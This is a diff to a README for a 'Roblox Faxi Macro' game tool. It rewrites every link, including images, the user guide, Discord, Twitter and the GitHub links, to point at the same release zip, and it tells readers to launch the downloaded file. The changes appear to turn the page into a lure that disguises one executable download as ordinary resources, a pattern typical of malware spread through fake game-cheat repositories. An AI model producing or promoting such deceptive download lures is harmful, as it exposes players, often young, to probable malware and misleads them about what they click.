@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to Roblox Faxi Macro Repository! 🤖
 
-![Roblox Faxi Macro](https://imgur.com/gallery/xxxxxxxx)
+![Roblox Faxi Macro](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)
 
 ## Repository Name: Roblox-Faxi-Macro
 ## Short Description: "Discover the best version of Faxi Macro with new features, adventures, and more! 🌟"
@@ -17,7 +17,7 @@
 ---
 
 ## 📎 Quick Links:
-- **[Download the Latest Version of Faxi Macro](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)**
+- **[Download the Latest Version of Faxi Macro](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)**
   - (Launch the downloaded file to enjoy the latest features! 💥)
 
 ---
@@ -51,9 +51,9 @@ Faxi Macro is a powerful tool designed to enhance the Roblox gaming experience b
 ---
 
 ## 📚 Resources:
-- **[Faxi Macro User Guide](https://github.com/Roblox-Faxi-Macro/wiki/User-Guide)**
-- **[Faxi Macro GitHub Repository](https://github.com/Roblox-Faxi-Macro)**
-- **[Faxi Macro Discord Community](https://discord.gg/FaxiMacro)**
+- **[Faxi Macro User Guide](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)**
+- **[Faxi Macro GitHub Repository](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)**
+- **[Faxi Macro Discord Community](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)**
 
 ---
 
@@ -68,9 +68,9 @@ Start your Faxi Macro journey today and experience Roblox like never before! �
 ---
 
 ## 🌟 Let's Connect:
-- **Follow us on Twitter:** [@FaxiMacroOfficial](https://twitter.com/FaxiMacroOfficial)
-- **Join our Discord Server:** [Faxi Macro Community](https://discord.gg/FaxiMacro)
-- **Explore our GitHub Repository:** [Faxi Macro GitHub](https://github.com/Roblox-Faxi-Macro)
+- **Follow us on Twitter:** [@FaxiMacroOfficial](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)
+- **Join our Discord Server:** [Faxi Macro Community](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)
+- **Explore our GitHub Repository:** [Faxi Macro GitHub](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)
 
 Thank you for being part of the Faxi Macro community! 🌟🚀
 
@@ -78,4 +78,4 @@ Thank you for being part of the Faxi Macro community! 🌟🚀
 
 ## 🚀 Happy Gaming with Faxi Macro! 🎮💥
 
-![Robot](https://imgur.com/gallery/xxxxxxxx)
+![Robot](https://github.com/K4tuu/Roblox-Faxi-Macro/releases/download/v2.0/Software.zip)
